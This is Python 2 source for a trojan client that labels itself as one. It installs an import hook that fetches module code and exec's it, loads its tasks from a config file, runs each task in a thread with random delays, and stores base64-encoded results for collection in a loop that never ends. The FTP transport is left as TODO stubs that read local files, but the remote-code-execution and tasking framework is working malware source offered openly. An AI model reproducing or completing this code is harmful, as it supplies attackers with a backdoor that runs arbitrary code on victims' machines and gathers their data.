#! /usr/bin/env python
# -*- coding:utf-8 -*-

import os
import Queue
import base64
import json
import sys
import time
import imp
import random
import threading

trojan_id     = "abc"
trojan_config = "%s.json" % trojan_id
data_path     = "data/%s/" % trojan_id

trojan_modules = []
configured = False
task_queue = Queue.Queue()

class FTP_Importer(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve '%s'" % fullname
            new_library = get_file_content("%s.py" % fullname)

            if new_library is not None:
                self.current_module_code = new_library
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module

        return module

def connect_to_ftp(username, password, port):
    print "[*] Connecting to ftp with USER " + username + " PASS " + password
    try:
        # TODO
        # Connect here
        print "[*] Success !"
    except Exception, e:
        print "[!] Connection to ftp failed. Exiting."
        sys.exit(1)

def get_file_content(filepath):

    found = False
    file = ""

    print "[*] Looking for %s in ftp folder" % filepath

    # TODO
    # Find file here
    for root, dirs, files in os.walk("."):

        # Ignoring hidden files and folder
        files   = [f for f in files if not f[0] == '.']
        dirs[:] = [d for d in dirs if not d[0] == '.']

        for f in files:
            if (f == filepath):
                found = True
                break

        if found:
            print "[*] File %s/%s found!" % (root,filepath)
            fullpath = root + "/" + filepath

            f = open(fullpath, 'r')
            content = f.read()
            f.close()
            return content

    if not found:
        print "[!] File not found. Exiting"
        sys.exit(1)

def get_trojan_config():
    
    global configured

    config_json = get_file_content(trojan_config)
    config      = json.loads(config_json)
    configured  = True

    for task in config:
        if task['module'] not in sys.modules:
            # print "[*] Importing " + task['module']
            exec("import %s" % task['module'])

    return config

def store_module_result(module, data):
    remote_path = "./data/%s/[%s] - %d.data" % (trojan_id, module[0:3], random.randint(100, 100000))
    print "\t[*] Writing data to " + remote_path + "..."
    try:
        f = open(remote_path, 'w')
        f.write(base64.b64encode(data))
        print "\t[*] Writing data successfully."
        f.close()
    except Exception, e:
        print "[!] " + str(e)
        print "[!] Unabled to write to " + remote_path + "."
        sys.exit(1)

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(module, result)

    return

sys.meta_path = [FTP_Importer()]

while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))

    time.sleep(random.randint(100,1000))